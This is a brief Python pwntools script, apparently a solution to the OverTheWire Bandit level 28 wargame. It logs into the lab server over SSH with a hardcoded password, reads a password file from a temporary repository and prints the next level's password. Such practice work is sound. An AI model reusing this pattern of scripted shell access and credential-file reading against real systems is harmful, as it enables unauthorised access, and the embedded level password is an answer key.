#!/usr/bin/env python
from pwn import *

log.info('overthewire.org - bandit28 exploit by SKane')

shell = ssh('bandit28', 'bandit.labs.overthewire.org', password='0ef186ac70e04ea33b4c1853d2526fa2', port=2220)

sh = shell.run('sh')

sh.sendline('cat /tmp/12121/repo/password.txt')

log.success("Password for bandit29: " + sh.recvline())
